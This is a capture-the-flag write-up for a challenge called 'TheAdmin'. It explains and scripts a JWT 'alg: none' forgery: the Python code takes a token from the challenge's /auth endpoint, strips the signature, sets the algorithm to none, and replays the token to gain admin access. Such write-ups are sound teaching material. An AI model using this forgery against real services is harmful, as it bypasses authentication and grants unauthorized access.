## Scenario

> The Professor has left a vulnerable authentication system. Can you exploit it and gain admin not just using admin? Sometimes the simplest loopholes can lead to the biggest breakthroughs. Its simple but **none** of you could figure out.

## Solution

You need to send a POST request to the `https://<url>/auth` endpoint with the username `admin`. The server will respond with a JSON object containing a token. This token is a JSON Web Token (JWT) that is base64 encoded and consists of three parts separated by a dot (`.`): the header, the payload, and the signature. You should create a new header with the algorithm set to `none` and the type set to `JWT`. Then, decode the payload from the token and create a new payload. After that, encode the new header and the new payload separately. Finally, send a GET request to the `https://<url>/access` endpoint with the new header and the new payload.

Here is the Python script to exploit the vulnerability:

```py
import requests
import base64

auth_url = "https://questcon-theadmin.chals.io/auth"
access_url = "https://questcon-theadmin.chals.io/access"

response = requests.post(auth_url, json={"username": "admin"})
response_header = b'{"alg": "none", "typ": "JWT"}'
response_payload = base64.b64decode(response.json()["token"].split(".")[1] + "==")

headers = {"Authorization": f"Bearer {base64.b64encode(response_header).decode().rstrip('=')}.{base64.b64encode(response_payload).decode().rstrip('=')}."}
response = requests.get(access_url, headers=headers)
print(response.text)
```
